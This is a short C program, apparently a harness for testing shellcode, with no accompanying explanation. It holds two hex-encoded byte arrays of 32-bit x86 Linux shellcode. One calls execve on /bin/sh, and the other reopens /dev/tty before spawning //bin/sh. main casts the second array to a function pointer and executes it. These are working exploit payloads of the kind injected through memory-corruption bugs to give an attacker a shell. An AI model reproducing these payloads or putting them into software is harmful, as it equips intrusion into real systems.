char shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x89\x46\x0c\x88\x46\x07\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
char nscode[] = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" ;

int main(int argc, char *argv[])
{
    // void (*shell)() = (void *) shellcode;
    void (*shell)() = (void *) nscode ;
    shell();
    return 0;
}